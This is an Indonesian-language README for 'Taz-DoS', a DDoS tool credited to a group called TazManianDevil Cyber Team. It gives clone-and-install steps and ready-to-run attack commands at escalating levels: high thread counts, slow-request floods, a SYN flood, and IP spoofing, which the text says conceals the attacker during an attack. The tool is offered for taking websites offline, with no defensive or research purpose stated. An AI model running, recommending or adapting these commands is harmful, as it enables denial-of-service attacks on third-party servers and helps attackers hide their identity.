# Taz-DoS

Taz-Dos adalah Tools DDoS dari team TazManianDevil Cyber Team. Tools ini adalah tools DDoS Website. 
DDoS adalah jenis serangan yang dilakukan dengan cara membanjiri lalu lintas jaringan internet pada server, sistem, atau jaringan. Umumnya serangan ini dilakukan menggunakan beberapa komputer host penyerang sampai dengan komputer target tidak bisa diakses. DDoS adalah serangan yang sangat populer digunakan oleh hacker.

# Installasi
1. pkg install python2
2. git clone https://github.com/tazmaniandevilcyberteam/Taz-DoS
3. cd Taz-DoS
4. pip2 install -r requirements.txt
5. python2 Taz-DoS.py

# Usage

1. Serangan biasa:

python2 taz-DoS.py -target www.target.com -port 80 -threads 800

2. Serangan menengah

python2 Taz-DoS.py -target www.target.com -port 80 -slow -request -threads 800

3. Serangan tingkat tinggi

python2 Taz-DoS.py -target www.target.com -port 80 -slow -request -threads 800 -syn

4. Serangan manipulasi IP

python2 Taz-DoS.py -target www.target.com -port 80 -slow -request -threads 800 -spoof 5.5.5.5

-spoof untuk manipulasi IP kita saat melakukan penyerangan

Coded By: DemonX
